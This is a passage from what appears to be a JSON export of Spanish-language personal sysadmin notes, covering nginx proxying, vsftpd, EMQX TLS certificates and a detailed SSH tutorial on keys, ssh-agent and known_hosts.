optional;\r\n\r\n        location /yourapp {\r\n            proxy_pass http://url_to_app.com;\r\n        #...\r\n        }\r\n\r\n    server {\r\n        listen      443 ssl;\r\n        server_name backend2.example.com;\r\n\r\n        ssl_certificate        /etc/ssl/certs/server.crt;\r\n        ssl_certificate_key    /etc/ssl/certs/server.key;\r\n        ssl_client_certificate /etc/ssl/certs/ca.crt;\r\n        ssl_verify_client      optional;\r\n\r\n        location /yourapp {\r\n            proxy_pass http://url_to_app.com;\r\n        #...\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n### NodeJS con Websockets\r\n\r\n```sh\r\nserver {\r\n listen 80;\r\n server_name domain.com;\r\n\r\n location /app {\r\n    proxy_pass http://localhost:3000;\r\n    proxy_http_version 1.1;\r\n    proxy_set_header Upgrade $http_upgrade;\r\n    proxy_set_header Connection 'upgrade';\r\n    proxy_set_header Host $host;\r\n    proxy_cache_bypass $http_upgrade;\r\n    proxy_read_timeout 60s; # por defecto son 60s. Es produce una reconexión de socket cada 60s\r\n  }\r\n}\r\n```\r\n",
    "path": "/servers/nginx/referencia"
  },
  {
    "id": 58,
    "title": "Por defecto se una a todas las interfaces \"0.0.0.0\"",
    "content": "\r\n```sh\r\n# Por defecto se una a todas las interfaces \"0.0.0.0\"\r\npython -m http.server 8000\r\n# A una interfaz determinada\r\npython -m http.server 8000 --bind 127.0.0.1\r\n# Server un directorio\r\npython -m http.server 8000 --directory /tmp/\r\n```\r\n",
    "path": "/servers/others/python-http"
  },
  {
    "id": 59,
    "title": "Cambiar el propietario",
    "content": "\r\n## Instalación\r\n\r\n`sudo apt install vsftpd`\r\n\r\n---\r\n\r\n## Iniciar y parar\r\n\r\n```sh\r\nsudo service vsftpd stop\r\nsudo service vsftpd reload\r\nsudo service vsftpd restart\r\nsudo service vsftpd status\r\n```\r\n\r\n--- \r\n\r\n## Configuración /etc/vsftpd.conf\r\n\r\n### Parámetros más importantes\r\n\r\n- `write_enable=YES`. Habilitar la escritura\r\n- `local_umask=022`. Nuevos permisos para los datos copiados al servidor. Por defecto es 077\r\n- `ftpd_banner`. Habilitar un banner de inicio de sesión\r\n- `chroot_list_enable=YES`. Los usuarios solo acceden dentro de su directorio /home/usuario\r\n- `chroot_list_file=/etc/vsftpd.chroot_list`. Lista de usuarios con sus rutas predeterminadas (poner un nombre de usuario por línea)\r\n- `anonymousenable=NO`. Deshabilita usuarios anónimos\r\n- `anon_upload_enable=YES`. Habilitar/Deshabilitar subida de archivos por usuarios anónimos\r\n\r\n## Agregar un usuario\r\n\r\n`sudo adduser rubenfgr`\r\n\r\nEn este momento ya se puede acceder al servidor con el usuario y contraseña creado\r\n\r\n## Otras configuraciones\r\n\r\n### Habilitar FTPS\r\n\r\n`ssl_enable=YES`\r\n\r\nEn este momento ya se puede acceder por SSL/TLS ya que en la instalación de vsftps, por defecto, genera los certificados RSA necesarios.\r\n\r\n### Otras directivas para SSL/TLS\r\n\r\n```sh\r\nllow_anon_ssl=NO\r\nforce_local_data_ssl=YES\r\nforce_local_logins_ssl=YES\r\nssl_tlsv1_1=NO\r\nssl_tlsv1_2=YES\r\nssl_tlsv1_3=YES\r\nssl_tlsv1=NO\r\nssl_sslv2=NO\r\nssl_sslv3=NO\r\nrequire_ssl_reuse=YES\r\nssl_ciphers=HIGH\r\n```\r\n\r\n## Puertos PASV (conexión de control)\r\n\r\nImportante si se quieren habilitar los puertos en el cortafuegos\r\n\r\n```sh\r\npasv_max_port=10000\r\npasv_min_port=9000\r\n```\r\n\r\n## Propietario y permisos\r\n\r\n```sh\r\n# Cambiar el propietario\r\nsudo chown user:user directorio|fichero\r\nsudo chown -R user:user directorio # recursivo\r\n# Permisos\r\nsudo chmod 777 directorio|fichero\r\nsudo chmod 777 -R directorio # recursivo\r\n```\r\n\r\n## Ejemplo para el directorio /var/www/html\r\n\r\n```sh\r\n# Ajustamos propietario y grupo (habitualmente será www-data)\r\nchown -R www-data:www-data /var/www/html/\r\n# Ajustamos permisos en ficheros y directorios\r\nfind /var/www/html/ -type d -exec chmod 0755 {} \\;   # rwxr-xr-x\r\nfind /var/www/html/ -type f -exec chmod 0644 {} \\;   # rw-r--r--\r\n```",
    "path": "/servers/protocols/FTP/vsftpd_ubuntu20"
  },
  {
    "id": 60,
    "title": "emqx",
    "content": "\r\n## SSL/TLS\r\n\r\n### Letsencrypt - Ubuntu\r\n\r\n1. **Instalar Certbot**\r\n\r\n   ```sh\r\n   sudo apt-get install certbot**\r\n   ```\r\n\r\n2. **Crear un certificado para el dominio a utilizar**\r\n\r\n   ```sh\r\n   sudo certbot certonly --standalone -d example.com -d emqx.example.com\r\n   ```\r\n\r\n3. **Verificar certificado con OpenSSL**\r\n\r\n   ```sh\r\n   openssl erify -CAfile /etc/letsencrypt/live/<DOMINIO>/chain.pem\r\n   # Debería dar un 'OK'\r\n   ```\r\n\r\n- **Dashboard**\r\n\r\n  Modificar \"/etc/eqmttd/plugins/emq_dashboard.conf\"\r\n\r\n  ```sh\r\n  dashboard.listener.https = 18084\r\n  dashboard.listener.https.access.1 = permitir todos los\r\n  dashboard.listener.https.acceptors = 2\r\n  dashboard.listener.https.max_clients = 512\r\n  dashboard.listener.https.access.1 = permitir todos\r\n  ## sustituya el \\$ dominio con su único\r\n  dashboard.listener.https.keyfile = /etc/letsencrypt/live/$domain/privkey.pem\r\n  dashboard.listener.https.certfile = /etc/letsencrypt/live/$domain/fullchain.pem\r\n  ```\r\n\r\n- **WSS**\r\n\r\n  Modificar \"/opt/emqx/etc/emqx.conf\"\r\n\r\n  ```sh\r\n  listener.wss.external.keyfile = /etc/letsencrypt/live/$domain/privkey.pem\r\n  listener.wss.external.certfile = /etc/letsencrypt/live/$domain/fullchain.pem\r\n  ```\r\n\r\n- **MQTT/SSL**\r\n\r\n  Modificar \"/opt/emqx/etc/emqx.conf\"\r\n\r\n  ```sh\r\n  listener.ssl.external.keyfile = /etc/letsencrypt/live/$domain/privkey.pem\r\n  listener.ssl.external.certfile = /etc/letsencrypt/live/$domaion/fullchain.pem\r\n  ```\r\n\r\n### Self-Signed\r\n\r\n[https://www.emqx.io/blog/emqx-server-ssl-tls-secure-connection-configuration-guide](https://www.emqx.io/blog/emqx-server-ssl-tls-secure-connection-configuration-guide)\r\n\r\n### Docker\r\n\r\n- **Crear volumenes para las claves**\r\n\r\n  ```sh\r\n   # docker-compose\r\n   service:\r\n     emqx:\r\n       volumes:\r\n         - /etc/letsencrypt/live/$domain/privkey.pem:/opt/emqx/etc/certs/privkey.pem\r\n         - /etc/letsencrypt/live/$domain/fullchain.pem:/opt/emqx/etc/certs/fullchain.pem\r\n  ```\r\n",
    "path": "/servers/protocols/MQTT/emqx"
  },
  {
    "id": 61,
    "title": "Host 172.22.200.175 found: line 88",
    "content": "\r\n## Instalación de un servidor SSH\r\n\r\nHabitualmente los equipos con alguna variedad de GNU/Linux traen un servidor ssh instalado, en el caso de los sistemas Debian y derivados el paquete que proporciona el servidor ssh se llama openssh-server. Podemos comprobar si ya está instalado mediante la instrucción:\r\n\r\n```sh\r\ndpkg -l |grep openssh-server\r\nii  openssh-server            ......\r\n```\r\n\r\nEl fichero de configuración de este servicio se encuentra habitualmente en /etc/ssh/sshd_config y contiene las opciones de configuración.\r\n\r\nLas opciones aplicadas las obtendríamos mediante:\r\n\r\n```sh\r\ngrep -v '^$\\|^#' /etc/ssh/sshd_config\r\n\r\nChallengeResponseAuthentication no\r\nUsePAM yes\r\nX11Forwarding yes\r\nPrintMotd no\r\nAcceptEnv LANG LC_*\r\nSubsystem    sftp    /usr/lib/openssh/sftp-server\r\n```\r\n\r\nSin embargo, en el caso de ssh hay muchas opciones que no vienen definidas y que se asume un valor por defecto, lo que puede resultar confuso. Sin embargo podemos utilizar la opción “-T: extended test mode” que comprueba la validez del fichero de configuración y muestra las opciones efectivas que se aplican (las que están habilitadas de forma explícita y las que tienen valores por defecto (en sistemas GNU/linux sshd sólo puede ejecutarlo un usuario privilegiado):\r\n\r\n```sh\r\nsshd -T\r\n...\r\nport 22\r\naddressfamily any\r\nlistenaddress [::]:22\r\nlistenaddress 0.0.0.0:22\r\nusepam yes\r\nlogingracetime 120\r\nx11displayoffset 10\r\nmaxauthtries 6\r\nmaxsessions 10\r\nclientaliveinterval 120\r\nclientalivecountmax 3\r\nstreamlocalbindmask 0177\r\npermitrootlogin without-password\r\nignorerhosts yes\r\nignoreuserknownhosts no\r\nhostbasedauthentication no\r\nhostbasedusesnamefrompacketonly no\r\npubkeyauthentication yes\r\nkerberosauthentication no\r\nkerberosorlocalpasswd yes\r\nkerberosticketcleanup yes\r\ngssapiauthentication no\r\ngssapikeyexchange no\r\ngssapicleanupcredentials yes\r\ngssapistrictacceptorcheck yes\r\ngssapistorecredentialsonrekey no\r\npasswordauthentication yes\r\nkbdinteractiveauthentication no\r\nchallengeresponseauthentication no\r\nprintmotd no\r\nprintlastlog yes\r\nx11forwarding yes\r\nx11uselocalhost yes\r\npermittty yes\r\npermituserrc yes\r\nstrictmodes yes\r\ntcpkeepalive yes\r\npermitemptypasswords no\r\npermituserenvironment no\r\ncompression yes\r\ngatewayports no\r\nusedns no\r\nallowtcpforwarding yes\r\nallowagentforwarding yes\r\ndisableforwarding no\r\nallowstreamlocalforwarding yes\r\nstreamlocalbindunlink no\r\nuseprivilegeseparation sandbox\r\nfingerprinthash SHA256\r\npidfile /run/sshd.pid\r\nxauthlocation /usr/bin/xauth\r\nciphers chacha20-poly1305@openssh.com,aes128-ctr, ...\r\nmacs umac-64-etm@openssh.com,umac-128-etm@openssh.com, ...\r\nversionaddendum none\r\nkexalgorithms curve25519-sha256,curve25519-sha256@libssh.org, ...\r\nhostbasedacceptedkeytypes ecdsa-sha2-nistp256-cert-v01@openssh.com, ...\r\nhostkeyalgorithms ecdsa-sha2-nistp256-cert-v01@openssh.com, ...\r\npubkeyacceptedkeytypes ecdsa-sha2-nistp256-cert-v01@openssh.com, ...\r\nloglevel INFO\r\nsyslogfacility AUTH\r\nauthorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2\r\nhostkey /etc/ssh/ssh_host_rsa_key\r\nhostkey /etc/ssh/ssh_host_ecdsa_key\r\nhostkey /etc/ssh/ssh_host_ed25519_key\r\nacceptenv LANG\r\nacceptenv LC_*\r\nauthenticationmethods any\r\nsubsystem sftp /usr/lib/openssh/sftp-server\r\nmaxstartups 10:30:100\r\npermittunnel no\r\nipqos lowdelay throughput\r\nrekeylimit 0 0\r\npermitopen any\r\n```\r\n\r\n---\r\n\r\n## Autenticación con usuario y contraseña\r\n\r\nEl método inicial de autenticación es utilizando los usuarios del sistema y las contraseñas que tienen almacenadas en el sistema. A SSH no le afecta la forma en la que el sistema almacena las contraseñas, entra en la forma en la que se almacenan las contraseñas (fichero, LDAP, etc.).\r\n\r\nLas opciones de configuración que afectan en este caso son las siguientes:\r\n\r\n```sh\r\npasswordauthentication yes|no\r\nchallengeresponseauthentication yes|no\r\npermitemptypasswords yes|no\r\n```\r\n\r\nTeóricamente challengeresponseauthentication es un mecanismo más complejo que permite preguntar al usuario otras cuestiones, no sólo la contraseña, pero en la práctica se suele preguntar la contraseña.\r\n\r\nEn sistemas GNU/Linux se añade la opción\r\n\r\n`usepam yes`\r\nQue permite utilizar el subsistema PAM como mecanismo de autenticación.\r\n\r\n### Ejercicio simple de acceso con usuario/contraseña\r\n\r\nAccedemos a un servidor remoto con:\r\n\r\n```sh\r\nssh usuario@172.22.200.175\r\nThe authenticity of host '172.22.200.175 (172.22.200.175)' can't be established.\r\nECDSA key fingerprint is SHA256:Bsv9OS7Qf94ANguOiDLNPHn7J+XlwisWZydmfqa4QMo.\r\nAre you sure you want to continue connecting (yes/no)?\r\n```\r\n\r\nPara verificar el servidor, en lugar de mostrarnos la clave pública completa, nos muestra la huella (fingerprint) de la clave pública del servidor, que no es más que un hash de la clave pública, en este caso utlizando SHA256. Podemos comprobar la correspondencia entre la clave pública y la huella mediante la instrucción:\r\n\r\nssh-keygen -l -E sha256 -f fichero_con_clave_publica\r\nPodríamos hablar con detalle de la forma efectiva de verificar las claves públicas, pero en este momento aceptamos la clave que se nos ofrece y por tanto tecleamos “yes” y a continuación nos pide la contraseña de acceso, la introducimos y accedemos a una shell en el equipo remoto:\r\n\r\n```sh\r\nWarning: Permanently added '172.22.200.175' (ECDSA) to the list of known hosts.\r\nusuario@172.22.200.175's password: **********\r\nLast login: Fri Feb 16 17:34:41 2018 from 172.23.0.22\r\nusuario@host:~$\r\n```\r\n\r\n### Ejecución remota\r\n\r\nSSH permite ejecutar una orden remotamente de forma no interactiva, lo que resulta muy cómodo cuando hay que realizar tareas muy específicas en un equipo remoto. Por ejemplo:\r\n`ssh usuario@172.22.200.175 sudo apt update`\r\n\r\nTambién se pueden encadenar varias órdenes o ejecutar un script:\r\n`ssh usuario@172.22.200.175 'sudo apt update && sudo apt upgrade'`\r\n\r\n### Consideraciones acerca de root\r\n\r\nSe puede restringir el acceso con el usuario root utilizando contraseña, aspecto importante desde el punto de vista de seguridad, por lo que hoy en día habitualmente se utiliza la opcion:\r\n\r\n`PermitRootLogin without-password`\r\n\r\nEn caso de que quisiéramos permitir acceder con el usuario root y contraseña, deberíamos poner esta opción a “yes”.\r\n\r\n### Otras opciones\r\n\r\nNo específicas del acceso con usuario y contraseña, pero adecuadas para empezar:\r\n\r\n```sh\r\nPrintLastLog yes|no\r\nPrintMotd yes|no\r\nBanner Ruta_a_fichero\r\n```\r\n\r\n---\r\n\r\n### Autenticación con claves pública/privada con frase de paso\r\n\r\nAunque el mecanismo más fácil de entender al utilizar ssh es la autenticación del usuario mediante la contraseña en el equipo remoto, el mecanismo más “natural” y probablemente más habitual es la autenticación mediante un par de claves pública/privada.\r\n\r\n### Creación de la clave privada\r\n\r\nPara crear la clave privada utilizaremos la herramienta ssh-keygen, especificando el algoritmo que deseamos utilizar mediante el parámetro -t (dsa | ecdsa | ed25519 | rsa | rsa1), por ejemplo:\r\n\r\n`ssh-keygen -t ecdsa`\r\n\r\nSe creará un diálogo mediante el cual nos pedirá una frase de paso para proteger la clave privada, paso que ignoraremos de momento y explicaremos con detalle en la siguiente sección:\r\n\r\n```sh\r\nGenerating public/private ecdsa key pair.\r\nEnter file in which to save the key (/home/alberto/.ssh/id_ecdsa): [ENTER]\r\nEnter passphrase (empty for no passphrase): [ENTER]\r\nEnter same passphrase again: [ENTER]\r\nYour identification has been saved in /home/alberto/.ssh/id_ecdsa.\r\nYour public key has been saved in /home/alberto/.ssh/id_ecdsa.pub.\r\nThe key fingerprint is:\r\nSHA256:QQ0bm3FBXKhLyWUfa7teeHgufwLPdK8nIu0UlMCJ6/M alberto@mut\r\nThe key's randomart image is:\r\n+---[ECDSA 256]---+\r\n|        =B==.    |\r\n|       ..BO...   |\r\n|       .=* .oo   |\r\n|        *. .+    |\r\n|       oS. ...   |\r\n|        +   o+. .|\r\n|         o .+*+..|\r\n|          E.=== +|\r\n|           +o++* |\r\n+----[SHA256]-----+\r\n```\r\n\r\nEn este caso hemos optado por dejar el nombre de la clave por defecto (~/.ssh/id_ecdsa). Si vamos al directorio ~/.ssh veremos que existen dos nuevos ficheros, que se corresponden con la clave pública y la privada:\r\n\r\n```sh\r\n-rw------- 1 alberto alberto   227 feb 18 09:16 id_ecdsa\r\n-rw-r--r-- 1 alberto alberto   173 feb 18 09:16 id_ecdsa.pub\r\n```\r\n\r\nLógicamente la clave privada se ha protegido en el sistema de forma que sólo el propietario puede leerla o modificarla, mientras que la pública puede leerla cualquier usuario y en general podrá estar accesible en cualquier sitio sin restricciones, ya que no es posible obtener la clave privada a partir de ella.\r\n\r\nVemos el contenido de estas claves (obviamente se muestran aquí a modo de ejemplo y se trata de claves que no se van a utilizar nunca en un entorno real):\r\n\r\n```sh\r\n~/.ssh/id_ecdsa\r\n-----BEGIN EC PRIVATE KEY-----\r\nMHcCAQEEIN53r8/ghcQ94wjNPtvz0VvSFsuU7ePsPkriWPhpC137oAoGCCqGSM49\r\nAwEHoUQDQgAEXJKU4yRlIdnKGG8qQA2PXpfCPVz9xpbB3TXOh9ymC9XtjgP3ZCwU\r\ntdNnLTQNJm8PO4MHtFZBTxeFE39lD7WVYQ==\r\n-----END EC PRIVATE KEY-----\r\n\r\n~/.ssh/id_ecdsa.pub\r\necdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAy\\\r\nNTYAAABBBFySlOMkZSHZyhhvKkANj16Xwj1c/caWwd01zofcpgvV7Y4D92QsFLXT\\\r\nZy00DSZvDzuDB7RWQU8XhRN/ZQ+1lWE= alberto@mut\r\n```\r\n\r\n### Copia de la clave pública en el equipo remoto\r\n\r\nPara que se pueda utilizar este mecanismo de autenticación es preciso que la clave pública del usuario se encuentre en la cuenta que éste posee en el equipo remoto, de forma más concreta, dentro del fichero ~/.ssh/authorized_keys, por lo que debemos utilizar algún método para ubicarla allí:\r\n\r\n- Accedemos con contraseña y copiamos y pegamos la clave pública\r\n- Accedemos con otra clave pública que hubiésemos copiado previamente y pegamos la nueva clave pública\r\n- Utilizamos cualquier sistema en el arranque de la máquina que obtenga la clave pública y la ubique en su sitio (muy habitual en cloud computing)\r\n- Utilizamos la herramienta ssh-copy-id\r\n  Vamos a ver el último método:\r\n\r\n```sh\r\nssh-copy-id -i ~/.ssh/id_ecdsa debian@172.22.200.175\r\n\r\n/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: \"/home/alberto/.ssh/id_ecdsa.pub\"\r\n/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed\r\n/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys\r\ndebian@172.22.200.175's password:\r\n\r\nNumber of key(s) added: 1\r\n\r\nNow try logging into the machine, with:   \"ssh 'debian@172.22.200.175'\"\r\nand check to make sure that only the key(s) you wanted were added.\r\n```\r\n\r\nSi accedemos al equipo remoto, podremos comprobar que la clave pública que hemos exportado se encuentra en el fichero ~/.ssh/authorized_keys.\r\n\r\n### Clave privada con nombre no estándar\r\n\r\nEn el caso anterior hemos creado un par de claves con nombre estándar (id_ecdsa e id_ecdsa.pub), pero es posible definir cualquier nombre a la hora de crear el par de claves, por ejemplo:\r\n\r\n```sh\r\nssh-keygen -t ed25519\r\nGenerating public/private ed25519 key pair.\r\nEnter file in which to save the key (/home/debian/.ssh/id_ed25519): openwebinars\r\nEnter passphrase (empty for no passphrase):\r\nEnter same passphrase again:\r\nYour identification has been saved in openwebinars.\r\nYour public key has been saved in openwebinars.pub.\r\nThe key fingerprint is:\r\nSHA256:HzEVg7wVelxLpuHrv+BUG8QG4bI0AsED7PnUvzFdlCI debian@asd\r\nThe key's randomart image is:\r\n+--[ED25519 256]--+\r\n|   ..oo. . .O++. |\r\n|    . o.  E*oXo. |\r\n|   . . o. B+*o=  |\r\n|    o . .o.B +.  |\r\n|     o  S.o...o  |\r\n|      .  .+o.. o |\r\n|          .++ .  |\r\n|          .o o   |\r\n|            . o. |\r\n+----[SHA256]-----+\r\n```\r\n\r\nProcederíamos de igual forma que en el caso anterior, aunque ahora para utilizar la clave en cualquier sesión ssh, deberíamos indicarlo de forma explícita:\r\n\r\n```sh\r\nssh -i ~/.ssh/openwebinars debian@172.22.200.175\r\n```\r\n\r\n### Utilización en cloud computing\r\n\r\nHoy en día es cada vez más habitual la utilización de máquinas virtuales en algún proveedor de nube de infraestructura pública o privada (AWS, Azure, OpenStack, etc.), en estos casos es imprescindible utilizar este mecanismo de clave pública/privada para acceder a estas máquinas virtuales.\r\n\r\n### Generación de una clave pública a partir de la privada\r\n\r\nAunque habitualmente se generan ambas claves, en diferentes circunstancias puede ocurrir que tengamos la clave privada, pero no la correspondiente clave pública, en ese caso podemos utilizar ssh-keygen para obtenerla:\r\n\r\n```sh\r\nssh-keygen -y -f clave >> clave.pub\r\n```\r\n\r\nEvidentemente si tenemos la clave pública y no la privada, no podemos hacer el proceso inverso.\r\n\r\n### Utilización en procesos no interactivos\r\n\r\nPuesto que teniendo acceso a la clave privada el acceso se puede realizar al equipo remoto sin ninguna intervención, este mecanismo es ideal para su utilización en procesos que no requieran intervención humana, como muchas conexiones que pueden realizarse entre diferentes equipos. La conexión es segura y autenticada, aunque es muy importante custodiar adecuadamente las claves privadas.\r\n\r\n---\r\n\r\n## Autenticación con claves pública/privada y frase de paso\r\n\r\nLa autenticación con clave privada tiene importantes ventajas respecto al acceso con contraseña, pero tiene el inconveniente de la custodia de la clave privada. Cualquier usuario que obtuviese nuestra clave privada podría entrar en nuestra cuenta de cualquier equipo en el que tuviésemos exportada la correspondiente clave pública. Para aumentar la seguridad en esta situación se utiliza una frase de paso para proteger la clave privada, frase que se introduce al crear la clave privada o que puede modificarse a posteriori. Vamos a crear una nueva clave, pero en este caso protegida con frase de paso:\r\n\r\n```sh\r\nssh-keygen -t ecdsa\r\nGenerating public/private ecdsa key pair.\r\nEnter file in which to save the key (/home/alberto/.ssh/id_ecdsa):\r\nEnter passphrase (empty for no passphrase): <- Teclear frase de paso\r\nEnter same passphrase again: <- Teclear frase de paso\r\nYour identification has been saved in /home/alberto/.ssh/id_ecdsa.\r\nYour public key has been saved in /home/alberto/.ssh/id_ecdsa.pub.\r\nThe key fingerprint is:\r\nSHA256:mvCLrZMvdUDOorOkvd/1iosAZmhGS2fWPQmjAVMjjtk alberto@mut\r\nThe key's randomart image is:\r\n+---[ECDSA 256]---+\r\n| +o+ o           |\r\n|ooo = = .        |\r\n|o+E= = +         |\r\n|+ = . + .        |\r\n|o* ... .S        |\r\n|=.+  o.o.        |\r\n| +.o o+..        |\r\n|. o.+= + .       |\r\n|  .o==B....      |\r\n+----[SHA256]-----+\r\n```\r\n\r\nDe esta forma la clave privada no es útil a menos que se conozca la frase de paso.\r\n\r\nProcedemos de igual forma que en el caso anterior, exportando la clave pública, aunque ahora cada vez que accedamos nos solicitará la frase de paso de la clave privada:\r\n\r\nssh -i ~/.ssh/id_ecdsa debian@172.22.200.175\r\nEnter passphrase for key '/home/alberto/.ssh/id_ecdsa':\r\nHemos ganado en seguridad, pero hemos perdido en usabilidad, porque ahora tenemos que escribir la frase de paso cada vez que accedamos al equipo remoto y además no es válido para procesos no interactivos. Para solucionar este inconveniente usaremos ssh-agent en una sección posterior.\r\n\r\n---\r\n\r\n## SSH - Agent\r\n\r\nActivar SSH-Agent\r\n\r\n```sh\r\neval \"$(ssh-agent -s)\"\r\nssh-keygen -t rsa -m PEM -f <nombre-clave>\r\nssh-copy-id -i ~/.ssh/id_ecdsa debian@172.22.200.175\r\n```\r\n\r\nssh-agent es un programa que permite almacenar las claves privadas de una sesión y es muy útil cuando usamos claves con frase de paso, ya que podemos añadir la clave privada al agente ssh y sólo tendremos que poner la frase de paso una vez, permitiendo utilizar ssh de forma transparente sin volver a introducir la frase de paso todo el tiempo que dure la sesión del usuario (realmente se puede limitar a una cantidad de tiempo menor si se desea).\r\n\r\nssh-agent se suele ejecutar automáticamente en las sesiones gráficas de los sistemas, como podemos verificar mediante:\r\n\r\n```sh\r\nenv |grep SSH\r\n...\r\nSSH_AUTH_SOCK=/run/user/1001/keyring/ssh\r\nSSH_AGENT_PID=2743\r\n```\r\n\r\nO a través de ps:\r\n\r\n```sh\r\nps aux |grep ssh-agent\r\nalberto   2743  .... ..... 0:00 /usr/bin/ssh-agent x-session-manager\r\n```\r\n\r\nDe hecho, si tuviéramos alguna clave privada sin frase de paso se habría cargado automáticamente en el agente ssh y podríamos utilizarla de forma totalmente transparente.\r\n\r\n### Añadir una clave privada a ssh-agent\r\n\r\nMediante la herramienta ssh-add podemos añadir una clave al agente ssh, por ejemplo:\r\n\r\n```sh\r\nssh-add ~/.ssh/openwebinars\r\n```\r\n\r\nSi la clave está protegida por una frase de paso, se nos pedirá en ese momento, o se utilizará la aplicación ssh-askpass si se tratase de una aplicación gráfica u otra que no tuviese asociada una terminal.\r\n\r\nPodemos ver las claves cargadas mediante:\r\n\r\n`ssh-add -L`\r\n\r\nY sus huellas con:\r\n\r\n`ssh-add -l`\r\n\r\nssh-agent permite que cualquier otra aplicación de la misma sesión utilice las claves privadas que almacena sin tener que volver a autenticarse, por lo que es importante controlar el uso de la sesión, bloqueándola cuando no se esté usando.\r\n\r\nSe pueden eliminar claves ssh del agente mediante:\r\n\r\n`ssh-add -d openwebinars`\r\n\r\nO incluso eliminar todas las claves con:\r\n\r\n`ssh-add -D`\r\n\r\n### Ejecución de ssh-agent\r\n\r\nEn el caso de que utilicemos un sistema que no haya cargado automáticamente un agente ssh, podemos ejecutarlo directamente, habitualmente se haría abriendo una nueva shell:\r\n\r\n`ssh-agent /bin/bash`\r\n\r\n---\r\n\r\n## Gestión de ficheros: authorized_keys y known_hosts\r\n\r\n### Fichero ~/.ssh/authorized_keys\r\n\r\nSe almacenan las claves públicas de los usuarios que pueden acceder a esta cuenta mediante clave pública/clave privada, el formato es:\r\n\r\n`algoritmo clave_publica comentario`\r\n\r\nPor ejemplo:\r\n\r\n`ssh-rsa AAAAB3NzaC1yc2EAA...dPh alberto@mut`\r\n\r\nSi queremos que utilizar un par de claves para acceder a un equipo, debemos asegurarnos de que exista la clave pública en este fichero y cuando ya dejemos de utilizarla debemos borrar la línea correspondiente.\r\n\r\n### Fichero ~/.ssh/known_hosts\r\n\r\nSe almacenan las claves públicas de todos los equipos remotos a los que nos hemos conectado y que hemos aceptado, el formato es:\r\n\r\n`nombre_o_IP_equipo algoritmo clave_pública`\r\n\r\nActualmente es más habitual que no se guarde el nombre o dirección IP del equipo en claro, sino que se almacene el hash. Para encontrar un determinado equipo por nombre o dirección IP podemos utilizar la instrucción:\r\n\r\n```sh\r\nssh-keygen -F 172.22.200.175\r\n# Host 172.22.200.175 found: line 88\r\n|1|lbA....9Lo= ecdsa-sha2-nistp256 AAAA.....ynTO90=\r\n```\r\n\r\n### Cambio de clave pública del servidor\r\n\r\nHabitualmente se almacenan las claves públicas de los servidores a los que nos hemos conectado previamente en el fichero ~/.ssh/known_hosts, por lo que se verifica cada vez que se conecta que el servidor ofrece la misma clave pública. En caso de que no coincida veremos el siguiente mensaje:\r\n\r\n```sh\r\nssh debian@172.22.200.175\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\r\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\r\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\r\nIt is also possible that a host key has just been changed.\r\nThe fingerprint for the ECDSA key sent by the remote host is\r\nSHA256:J9CMWSbavkqECRI1KWhy8s/D7UVJWDiysAocAbo1F6k.\r\nPlease contact your system administrator.\r\nAdd correct host key in /home/alberto/.ssh/known_hosts to get rid of this message.\r\nOffending ECDSA key in /home/alberto/.ssh/known_hosts:88\r\n  remove with:\r\n  ssh-keygen -f \"/home/alberto/.ssh/known_hosts\" -R 172.22.200.175\r\nECDSA host key for 172.22.200.175 has changed and you have requested strict checking.\r\nHost key verification failed.\r\n```\r\n\r\nEs posible que se trate de una suplantación y por tanto un problema de seguridad, pero también es posible que se haya realizado un cambio en el servidor que haya implicado un cambio en las claves del servicio ssh o una situación muy habitual hoy en día: estamos reutilizando la misma IP para un nuevo servidor.\r\n\r\nEn caso de que estemos seguros de que no hay ningún problema de seguridad al acceder a ese equipo remoto, debemos eliminar la antigua clave asociada a la dirección IP (o al nombre), mediante la instrucción:\r\n\r\n```sh\r\nssh-keygen -R 172.22.200.175\r\n# Host 172.22.200.175 found: line 88\r\n/home/alberto/.ssh/known_hosts updated.\r\nOriginal contents retained as /home/alberto/.ssh/known_hosts.old\r\n```\r\n\r\n---\r\n\r\n## Forwarding\r\n\r\nAgent forwarding\r\nMediante esta técnica, es posible que el cliente ssh se comunique con un agente ssh que corre un una máquina remota y sin necesidad de poner las claves privadas en él, poder saltar a otro equipo remoto no accesible directamente. Es una técnica muy útil que permite no exponer directamente los servidores a los que realmente queremos acceder mediante ssh, sino que accedemos a ellos de forma transparente usando un equipo a modo de bastión.\r\n\r\nEsta posibilidad debe estar habilitada en el servidor intermedio mediante la directiva:\r\n\r\n`allowagentforwarding yes`\r\n\r\nQue está habilitada por defecto.\r\n\r\nEn el cliente es necesario habilitar el parámetro:\r\n\r\n`ForwardAgent yes`\r\n\r\nX11 forwarding\r\nA través de la técnica de X11 forwarding podemos ver en nuestra pantalla aplicaciones gráficas que se ejecutan a través de ssh en un equipo remoto (y viceversa).\r\n\r\nAunque en primer lugar tiene que estar permitido en el servidor a través de las directivas:\r\n\r\n```sh\r\nX11Forwarding yes\r\nX11DisplayOffset 10\r\n```\r\n\r\nEl cliente para conectarse y utilizar esta funcionalidad, deberá configurar adicionalmente la opción:\r\n\r\n`ForwardX11 yes`\r\n\r\nAl conectarnos por ssh podremos comprobar que está definida la variable DISPLAY con un valor definido a través de la variable X11DisplayOffset, por ejemplo:\r\n\r\n`env |grep DISPLAY`\r\n\r\nDISPLAY=localhost:10\r\nAl ejecutar una aplicación en el equipo remoto sobre la conexión ssh nos aparecerá en nuestra pantalla.\r\n\r\n### Configuración del cliente\r\n\r\nExiste el fichero /etc/ssh/ssh_config en el que se especifican los parámetros de configuración generales que van a utilizar por defecto todos los clientes ssh que se ejecuten en esa máquina.\r\n\r\nLos posibles parámetros que podemos definir en ese fichero se detallan en la página 5 del manual de ssh_config.\r\n\r\n### Algunos parámetros significativos\r\n\r\nSendEnv LANG LC\\_\\*\r\nMediante este parámetro se define en el equipo remoto los parámetros de localización del 